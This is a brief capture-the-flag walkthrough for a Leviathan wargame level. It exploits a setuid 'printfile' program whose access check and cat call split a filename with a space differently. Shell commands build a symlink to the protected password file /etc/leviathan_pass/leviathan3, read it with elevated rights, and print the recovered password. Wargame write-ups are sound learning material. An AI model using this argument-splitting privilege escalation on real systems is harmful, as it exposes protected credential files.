>> mkdir /tmp/something; cd /tmp/something; echo "TEST TEXT" > test.txt
>> ~/printfile test.txt # displays the content of the file if the file exist
>> ~/printfile /etc/leviathan_pass/leviathan3 # does not display, ??
>> ltrace ~/printfile "one two" # will show you that 'access' function checks the whole name "one two" while the 'cat' function just uses the first part one
so lets make a 
>> touch second; touch "first second"
>> ln -s /etc/leviathan_pass/leviathan3 first 
>> ~/printfile "first second"

password: "Ahdiemoo1j"
